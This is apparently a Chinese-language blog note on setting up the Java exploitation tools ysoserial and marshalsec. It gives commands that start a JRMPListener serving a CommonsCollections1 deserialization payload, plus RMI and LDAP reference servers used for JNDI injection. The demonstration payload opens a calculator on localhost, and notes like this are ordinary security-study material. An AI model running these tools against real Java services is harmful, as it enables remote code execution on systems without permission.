---
title: "ysoserial&marshalsec调试"
date: 2022-04-01 13:05:36
onlyTitle: true
categories:
- java
- java杂谈
tags:
- ysoserial
- marshalsec
- JNDI
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B845.png

---

ysoserial安装使用调试

## 安装

下载链接：https://github.com/frohoff/ysoserial

下载后需要自己编译生成jar包，这里把测试关掉后package打包就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227133507897.png)

需要java1.7以上

也可以直接下载jar：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar





# 使用

运行主类函数，如JRMPListener

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471
```

运行exploit类。开启交互式服务，这里利用exploit.JRMPListener开启1099端口，并用CC1弹计算器。命令行的-cp参数表示指定classpath

```bash
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'calc'
```

查看ysoserial的payload:

```bash
java -jar ysoserial.jar
```





# marshalsec

可以直接下jar版，也可https://gitee.com/mirrors/marshalsec下载后自行编译

开启RMI服务：

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#ExportObject 1099
```

利用jndi.RMIReferServer开启RMI服务，绑定的远程对象在http://127.0.0.1/css/#ExportObject，端口1099

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png)



开启LDAP服务：

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389
```

暂时只需要那么多

